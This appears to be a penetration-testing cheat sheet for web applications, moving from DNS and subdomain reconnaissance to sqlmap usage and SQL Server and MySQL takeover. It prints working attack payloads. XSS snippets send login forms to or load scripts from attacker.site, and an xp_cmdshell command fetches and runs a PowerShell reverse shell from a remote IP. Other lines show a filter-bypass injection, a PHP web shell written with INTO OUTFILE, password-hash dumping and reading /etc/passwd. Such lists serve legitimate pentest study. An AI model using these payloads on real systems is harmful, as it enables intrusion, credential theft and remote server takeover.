# Web App Security


## Information Gathering

####  Gathering Information

**Whois**
```
> whois google.com                                # Linux
> whois.exe google.com                            # Windows
```

**Netcraft**
```
https://sitereport.netcraft.com/
```

**IP Resolve** 
```bash
dig domain.com
```
```bash
nslookup domain.com
```

**Nameserver lookup**
```bash
dig domain.com NS
```
```bash
nslookup -type=NS domain.com
```


**Reverse DNS lookup**
```bash
dig domain.com PTR
```
```bash
nslookup -type=PTR domain.com
```

**Mail Exchange lookup**
```bash
dig domain.com MX
```
```bash
nslookup -type=MX domain.com
```

**Zone transfers**
```bash
dig axfr @DNS_IP domain.com
```
```bash
nslookup
> server [nameserver for domain.com]
> 1s -d domain.com
```


**DNS Tools**
```bash
fierce --domain domain.com 
```
```bash
fierce --domain domain.com --dns-servers {IP}
```

```bash
dnsenum domain.com
```
```bash
dnsenum domain.com --dnsserver {DNS IP}
```
```bash
dnsenum domain.com -f {subdomain file}
```

```bash
dnsmap domain.com
```
```bash
dnsmap domain.com -w {subdomain file}
```

```bash
dnsrecon -d domain.com
```
```bash
dnsrecon -d domain.com -n {NS IP}
```
```bash
dnsrecon -d domain.com -{scan option}
```



#### Infrastructure

**Fingerprint WebServer**
```
# Netcraft
https://sitereport.netcraft.com/



# NetCat
> nc domain.com 80
> HEAD / HTTP/1.0


# WhatWeb
> whatweb domain.com
> whatweb -v domain.com
> whatweb -a 3 -v domain.com


# httprint
```



**Enumerating Subdomains** 
```
# Enumerate Subdomains with netcraft
https://searchdns.netcraft.com/


-------------------------------------------------------------------------------

# Enumerate Subdomains with Google
Google > site:.domain.com                            # Search Subdomains
Google > site:.domain.com -inurl:www.                # Search Without www.



-------------------------------------------------------------------------------


# Enumerate Subdomains with Tools
> dnsrecon -h
> dnsrencon -d domain.com -g                         # Perform Google Enum


> theharvester -d domain.com -b all                  # Subdomain Enum 


-------------------------------------------------------------------------------


# Enumerating Subdomains with Zone Transfers
> nslookup -type=NS domain.com                     # Find Nameservers
> nslookup
> server [NAMESERVER]
> 1s -d domain.com


> dig axfr domain.com @NAMESERVER


-------------------------------------------------------------------------------

```


**Finding Virtual Hosts**
```
fierce -dns domain.com
```



**Fingerprinting Frameworks and Applications**
**Fingerprinting Third-Party Add-Ons**
**Mapping Attack Surface**
	Client Side Validation
	Database Interaction
	File Uploading and Downloading
	Display of User Supplied Data
	Redirections
	Access Controls and Login Protected Pages
	Error Messages
	Charting
 

#### Enumerating Resources

**Crawling with Burp Suite**

**Finding Hidden Data**
```
# List of Backup file extensions
1. bak
2. bac
3. old
4. 000
5. ~
6. 01
7. _bak
8. 001
9. inc
10. Xxx


# On ASP.net based framework .inc is used. 


# Configuration Files Source Code View Examples
1. configuration.php.bak
2. configuration.php.old
3. ...



# Check Availability of PUT request
> curl -X OPTIONS domain.com


# Guess writable folder to use PUT method include folders where user supplied files are stored.

``` 


**Google Hacking**
```
https://www.exploit-db.com/google-hacking-database

``` 


## Cross Site Scripting

```
# Change Page Content
<script>document.body.innerHTML="<h1>HACKED</h1>";</script>


# XSS Phishing on Login Page
<script>document.form[0].action="htpps://attacker.site/steal.php";</script>


# Create Element with Remote JS File
> var s = document.createElement('SCRIPT');
> s.src = '//attacker.site/alert.js';
> document.body.appendChild(s);
```


## SQL Injection

**SQLmap**
```
# Basic Syntax
> sqlmap -u <URL> -p <injection parameter> [options]


# Basic Post Requiest Injection
> sqlmap -u <URL> --data=<POST string> -p <parameter> [options]


# Specify File
> sqlmap -r <request file> -p <parameter> [options]


# Retrieve Banner
> sqlmap -u <URL> --banner 


# List Users of Database
> sqlmap -u <URL> --users 


# Check if User is Administrator
> sqlmap -u <URL> --is-dba 


# List All of the Databases
> sqlmap -u <URL> --dbs


# List Tables
> sqlmap -u <URL> -D <database> --tables


# List Columns
> sqlmap -u <URL> -D <database> -T <table> --columns


# Dump Table
> sqlmap -u <URL> -D <database> -T <table> -C <column> --dump


# Specify DBMS
> sqlmap -u <URL> --dbms=<DBMS>


# Append String which is always resented in output
> sqlmap -u <URL> --string "johnDoe"


# If injected payload needs to end with '));
> sqlmap -u <URL> --suffix "'));"


# Persistent Connections To Dump Bounch of Data
> sqlmap -u <URL> --keep-alive 


# Reduce Dumping Phase Time
> sqlmap -u <URL> --threads <1-10>


# Level Attribute
* Level 2 = The Cookie Header
* Level 3 = The User Agent and Referrer
* Level 5 = The Host


# Risk Attribute
* Level 1 - Innocous Inejctions (Default)
* Level 2 - Enables Heavy Time-Based Injections
* Level 3 - Enables OR-Based Injections


```



#### **Server Takeover**


**SQL Server**
```
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —


-------------------------------------------------------------------------------

# Get Username and Password hash
> SELECT name, password FROM master..sysxlogins
> SELECT name, password_hash FROM master..sys.sql_logins


# Port Scanning
> SELECT * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=something,Network=DBMSSOCN;Address=<Target IP>,<Target PORT>;timeout=<connection timeout in secconds>', 'select 1')-- 


# Read file and Save output of command on a web accessible folder
> EXEC master..xp_cmdshell 'dir C:\ > C:\inetpub\wwwroot\site\dir.txt'--


# Read file and puts its content into a table.
> CREATE TABLE filecontent(line varchar(8000));
> BULK INSERT filecontent FROM '<target_file>';


# Upload file to the victim Server
1. Insert the file into a table in MS SQL database under our control
	> CREATE TABLE HelperTable (file text)
	> BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
1. Force the target DB server to retrieve it from our server
	> EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<out server address> -U<out server username> -P<out server password>'

```


**MySQL**
```
# Read File
> select load_file('/etc/passwd');

# Write to a file
> select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'


# Write the result of a query to a file
> select <field> from <table> into dumpfile '<output file path>';


# Execution Shell Commands - User Defined Functions (UDF)
> sqlmap -u <URL> --os-cmd
> sqlmap -u <URL> --os-shell



```

## Common Web Attacks

**Session Files**
```
# PHP Session stored within the folder specified by the php.ini entry - sesion.save_path.
# PHP session file name example - sess_<session_id>

-------------------------------------------------------------------------------

# Java - Tomcat sessions stored in SESSIONS.ser 
```


**Session Fixation**
```
# Session fixation exist if the server identifier(session) remains the same after successfuly login
```